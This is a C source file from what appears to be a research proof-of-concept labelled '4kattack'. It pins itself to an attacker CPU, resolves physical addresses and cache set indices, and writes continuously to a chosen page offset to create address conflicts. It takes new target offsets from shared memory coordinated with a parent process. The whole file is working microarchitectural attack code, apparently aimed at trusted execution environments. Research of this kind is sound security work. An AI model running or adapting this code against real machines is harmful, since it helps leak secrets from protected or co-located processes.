#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdint.h>
#include <assert.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "attack.h"
#include "setup.h"
#include "utils.h"

#define ATTACKER_CPU 5
#define PSTATE_PCT 100

uint32_t *shared_mem_pointer = NULL;

int connect_to_shared_memory() {

  int shared_mem_fd = shm_open("teejam_comm_memory", O_RDWR, 0);
  if (shared_mem_fd == -1) {
    fprintf(stderr, "[4kattack]  MEMORY_ERROR: Cannot open shared memory.\n");
    return 1;
  }

  shared_mem_pointer = mmap(NULL, 8, PROT_READ | PROT_WRITE, MAP_SHARED, shared_mem_fd, 0);
  if (shared_mem_pointer == NULL) {
    fprintf(stderr, "[4kattack]  MEMORY_ERROR: Cannot mmap shared memory.\n");
    return -1;
  }

  return 0;
} 

int main(int argc, char **argv) {

    ASSERT(!claim_cpu(ATTACKER_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
    
    connect_to_shared_memory();

    uint64_t target_page_offset = 0;
    uint64_t old_target_page_offset = 0;
    if (argc == 2) {
        char *offset = argv[1];

        target_page_offset = (uint64_t) strtoul(offset, NULL, 16);
    }

    fprintf(stdout, "\n[4kattack] Targeting page offset 0x%lx\n",
            target_page_offset);


    // Allocate three memory pages for creating address conflicts
    size_t memory_page_size = 4096;

    void *mem = malloc (3 * memory_page_size * sizeof(uint8_t));
    uint8_t *cur = (uint8_t*) mem;
    for (size_t i = 0; i < 3 * memory_page_size; i++) {
        *(cur + i) = 1;
    }

    uintptr_t target = ((((uintptr_t)(cur + memory_page_size))
            & ~((uintptr_t) (memory_page_size - 1))) + target_page_offset);

    uintptr_t target_phy = getPhysAddr((void*) target);
    uint64_t target_phy_set_index = (uint64_t) getSetIndexBits(target_phy, 10, 6);

    fprintf(stdout, "[4kattack] Target address:  "
            "0x%lx (virt), 0x%lx (phy), 0x%lx (set index)\n",
            target, target_phy, target_phy_set_index);

    // Sending alarm signal to parent
    kill(getppid(), SIGALRM);

    // Start writing to desired conflict address
    // pause();
    uint64_t print = 1;
    while (1) {
        
        if (target_page_offset < 0xc40 || target_page_offset >= 0xc80) {
          write_conflict(target);
          print = 1;
        } else {
          if(print == 1) {
            fprintf(stderr, "[4kattack] ####### Ignoring current offset: %lx\n", target_page_offset);
            print = 0;
          }
        }

        old_target_page_offset = target_page_offset;
        target_page_offset = shared_mem_pointer[1];

        if (old_target_page_offset != target_page_offset) {
          
          target = ((((uintptr_t)(cur + memory_page_size))
            & ~((uintptr_t) (memory_page_size - 1))) + target_page_offset);

          // fprintf(stdout,"[4kattack] Changed to new offset: 0x%lx\n", target_page_offset);
          shared_mem_pointer[0] = 1; 
        }
    }

    free(mem);
}
